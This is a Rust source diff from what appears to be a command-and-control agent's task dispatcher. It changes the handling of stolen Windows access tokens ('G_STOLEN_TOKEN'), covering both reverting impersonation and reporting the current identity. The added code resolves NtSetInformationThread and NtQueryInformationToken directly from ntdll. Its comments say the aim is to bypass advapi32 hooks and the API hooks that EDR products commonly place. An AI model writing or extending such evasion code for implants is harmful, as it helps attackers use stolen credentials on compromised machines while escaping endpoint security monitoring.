@@ -1839,7 +1839,21 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         #[cfg(target_os = "windows")]
         "TOKEN_DROP" | "REV2SELF" => {
             unsafe {
-                RevertToSelf();
+                // NtSetInformationThread(ThreadImpersonationToken=5, NULL) — avoids advapi32 hook
+                use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+                type NtSITFn = unsafe extern "system" fn(usize, u32, *mut usize, u32) -> i32;
+                let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+                let mut reverted = false;
+                if ntdll != 0 {
+                    if let Some(f) = GetProcAddress(ntdll, b"NtSetInformationThread\0".as_ptr()) {
+                        let f: NtSITFn = std::mem::transmute(f);
+                        let mut null_h: usize = 0;
+                        f(GetCurrentThread() as usize, 5, &mut null_h,
+                          std::mem::size_of::<usize>() as u32);
+                        reverted = true;
+                    }
+                }
+                if !reverted { RevertToSelf(); }
                 let old = G_STOLEN_TOKEN.swap(0, Ordering::AcqRel);
                 if old != 0 { CloseHandle(old); }
             }
@@ -1847,23 +1861,62 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         #[cfg(target_os = "windows")]
         "TOKEN_WHOAMI" => {
-            // Use GetUserNameExW(NameSamCompatible) so we read the calling
-            // thread's effective identity, which respects impersonation tokens
-            // set by TOKEN_MAKE. shell("whoami") spawns a subprocess and
-            // inherits only the process token, missing thread impersonation.
+            // NT path: OpenThreadToken → NtQueryInformationToken → LookupAccountSidW
+            // Avoids GetUserNameA/W/Ex which are commonly hooked by EDRs.
             let who = unsafe {
-                use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
-                type GetUserNameExWFn = unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32;
-                let lib = LoadLibraryA(b"secur32.dll\0".as_ptr());
+                use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+                use windows_sys::Win32::Security::{OpenThreadToken, OpenProcessToken, TOKEN_QUERY,
+                    LookupAccountSidW};
+                use windows_sys::Win32::System::Threading::{GetCurrentThread, GetCurrentProcess};
+                type NtQITFn = unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
+                let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
                 let mut result = String::new();
-                if lib != 0 {
-                    let proc = GetProcAddress(lib, b"GetUserNameExW\0".as_ptr());
-                    if let Some(f) = proc {
-                        let f: GetUserNameExWFn = std::mem::transmute(f);
-                        let mut buf = [0u16; 256];
-                        let mut sz: u32 = 256;
-                        if f(2, buf.as_mut_ptr(), &mut sz) != 0 {
-                            result = String::from_utf16_lossy(&buf[..sz as usize]).to_string();
+                if ntdll != 0 {
+                    if let Some(f) = GetProcAddress(ntdll, b"NtQueryInformationToken\0".as_ptr()) {
+                        let f: NtQITFn = std::mem::transmute(f);
+                        let mut h_tok: usize = 0;
+                        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 1, &mut h_tok) == 0 {
+                            OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_tok);
+                        }
+                        if h_tok != 0 {
+                            let mut needed: u32 = 0;
+                            f(h_tok, 1, std::ptr::null_mut(), 0, &mut needed);
+                            if needed > 0 {
+                                let mut buf = vec![0u8; needed as usize];
+                                if f(h_tok, 1, buf.as_mut_ptr(), needed, &mut needed) == 0 {
+                                    // TOKEN_USER: first usize is PSID
+                                    let sid = *(buf.as_ptr() as *const usize);
+                                    let mut name_buf = [0u16; 256];
+                                    let mut dom_buf  = [0u16; 256];
+                                    let mut name_len: u32 = 256;
+                                    let mut dom_len:  u32 = 256;
+                                    let mut sid_type: u32 = 0;
+                                    if LookupAccountSidW(std::ptr::null(), sid as *const _,
+                                            name_buf.as_mut_ptr(), &mut name_len,
+                                            dom_buf.as_mut_ptr(),  &mut dom_len,
+                                            &mut sid_type) != 0 {
+                                        let user = String::from_utf16_lossy(&name_buf[..name_len as usize]);
+                                        let dom  = String::from_utf16_lossy(&dom_buf[..dom_len as usize]);
+                                        result = format!("{}\\{}", dom, user);
+                                    }
+                                }
+                            }
+                            windows_sys::Win32::Foundation::CloseHandle(h_tok);
+                        }
+                    }
+                }
+                // Fallback: GetUserNameExW
+                if result.is_empty() {
+                    type GetUserNameExWFn = unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32;
+                    let lib = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"secur32.dll\0".as_ptr());
+                    if lib != 0 {
+                        if let Some(f) = GetProcAddress(lib, b"GetUserNameExW\0".as_ptr()) {
+                            let f: GetUserNameExWFn = std::mem::transmute(f);
+                            let mut buf = [0u16; 256];
+                            let mut sz: u32 = 256;
+                            if f(2, buf.as_mut_ptr(), &mut sz) != 0 {
+                                result = String::from_utf16_lossy(&buf[..sz as usize]).to_string();
+                            }
                         }
                     }
                 }
